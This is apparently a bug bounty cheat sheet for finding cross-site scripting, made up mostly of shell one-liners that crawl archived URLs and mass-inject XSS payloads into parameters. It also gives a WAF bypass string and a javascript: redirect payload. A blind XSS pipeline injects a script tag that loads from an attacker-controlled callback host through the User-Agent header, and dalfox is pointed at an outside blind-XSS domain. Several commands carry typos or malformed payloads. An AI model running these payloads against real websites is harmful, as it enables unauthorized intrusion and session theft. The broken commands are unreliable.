
# 				XSS-Bug bounty tips

## TIP 1:
	
	1- Find Parameter and test any reflection on response.
	2- Try to find hidden input: [Here you can find blog to find hiddne parameter/input fields](https://portswigger.net/research/xss-in-hidden-input-fields)
	3- Find sink source for DOM XSS
	4- FInd any local stoage in jvascript.
	5- Test in cookie 
	6- Test in userAgent \ Header Injection
	
	If <script> - payload blocked by WAF; then try it -- ( sr<script>b1mal )


Find XSS with automation:

 	echo http://example.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
	install freq: - go get -u https://github.com/takshal/freq

  	echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
 	AirisXSS - Insatallation : https://github.com/ferreiraklet/airixss

	 XSpear -u "http://domain.com/dir.php?param=123" -v 1
	
	success?next_url=javascript%3Aalert%2F**%2F(document.domain)


 ## TIP- 2:
       
      First you need to gather subdomain of target:
      $ subfinder -d example.com -o subdomain.txt
  
      The Next process was to find the number of sub-domains which are active,
      $ cat subdomains.txt | httprobe | tee -a host.txt

      Now gather some endpoint to the host.txt
      $ cat host.txt | waybackurl | tee -a endpoint.txt
   
      started to fuzz all the parameters to find xss vulnerability with the help of the tool qsreplace.
      $ cat endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a xss_fuzz.txt

      After executing the command now, I had to check the number of parameters have been reflecting our
        payload into a plain text weather or not.

      $ cat xss_fuzz.txt | freq | tee -a possible_xss.txt
      
            
      
## TIP-3:

      Oneliner XSS automation by 
     @BountyOverflow
 
	     echo http://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '">		<img src=x onerror=alert(1);>' | freq


## Finding XSS with onliner commadnline:

    	echo www.example.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload-confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

	echo http://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '">	<img 		src=x onerror=alert(1);>' | freq 

	go run main.go test.php.vulnweb.com | tee testphp1.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat 
	combined.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n"


 Find XSS Tips:
 -------------
```bash
$ wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @

$ gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt

$ waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b http://blindxss.xss.ht pipe > output.txt
	 
$ waybackurls http://testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
	
```



## Blind XSS at scale 🔥🔥🔥
```bash
cat roots.txt | waybackurls | httpx -H "User-Agent: \"><script src=$YOUR_XSS_HUNTER></script>" 

#And monitor your xss hunter dashboard  
```




 

 








